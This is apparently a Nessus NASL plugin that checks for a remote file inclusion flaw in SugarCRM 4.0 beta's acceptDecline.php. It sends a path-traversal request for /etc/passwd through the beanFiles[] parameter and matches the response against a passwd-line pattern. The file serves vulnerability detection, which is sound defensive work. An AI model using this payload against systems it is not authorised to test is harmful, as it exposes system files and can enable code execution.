#%NASL_MIN_LEVEL 70300
#
# Script Written By Ferdy Riphagen 
# <f[dot]riphagen[at]nsec[dot]nl>
#
# Script distributed under the GNU GPLv2 License.
#

# Changes by Tenable:
# - Revised plugin title (4/7/2009)
# - Use results from sugarcrm_detect (2009-12-21)

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(20286);
  script_version("1.23");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2005-4086", "CVE-2005-4087");
  script_bugtraq_id(15760);

  script_name(english:"SugarCRM <= 4.0 beta acceptDecline.php Remote File Inclusion");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to multiple
flaws.");
  script_set_attribute(attribute:"description", value:
"SugarCRM is a Customer Relationship Manager written in PHP. 

The version of SugarCRM installed on the remote host does not properly
sanitize user input in the 'beanFiles[]' parameter in the
'acceptDecline.php' file.  A attacker can use this flaw to display
sensitive information and to include malicious code to execute
arbitrary commands. 

This vulnerability is exploitable if 'register_globals' is enabled.");
  script_set_attribute(attribute:"see_also", value:"http://retrogod.altervista.org/sugar_suite_40beta.html");
  script_set_attribute(attribute:"see_also", value:"https://marc.info/?l=bugtraq&m=113397762406598&w=2");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Sugar Suite version 3.5.1e and/or disable PHP's 
'register_globals' setting.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2005/12/07");
  script_set_attribute(attribute:"plugin_publication_date", value:"2005/12/10");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2022 Ferdy Riphagen");

  script_dependencies("http_version.nasl", "sugarcrm_detect.nasl");
  script_require_keys("www/sugarcrm");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default:80, embedded:TRUE);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);
if (!can_host_php(port:port)) exit(0);

install = get_kb_item('www/' + port + '/sugarcrm');
if (isnull(install)) exit(0, "sugarcrm is not installed on port "+port);
v = eregmatch(string:install, pattern:'(.+) under (/.*)$');
if (isnull(v)) exit(1, "sugarcrm is not installed on port "+port);

dir = v[2];

  string[0] = "../../../../../../../../etc/passwd";
  if ( thorough_tests )
	{
  	string[1] = string("http://", get_host_name(), "/robots.txt");
	pat =  "root:.*:0:[01]:.*:|User-agent:";
	}
   else
	pat = "root:.*:0:[01]:.*:";
 
  for(exp = 0; string[exp]; exp++)
  {
   req = http_get(item:string(dir, "/acceptDecline.php?beanFiles[1]=", string[exp], "&beanList[1]=1&module=1"), port:port);
   recv = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
   if(recv == NULL)exit(0);
   
   if( egrep(pattern: pat, string:recv))
   {
    security_hole(port);
    exit(0);
   }
  }
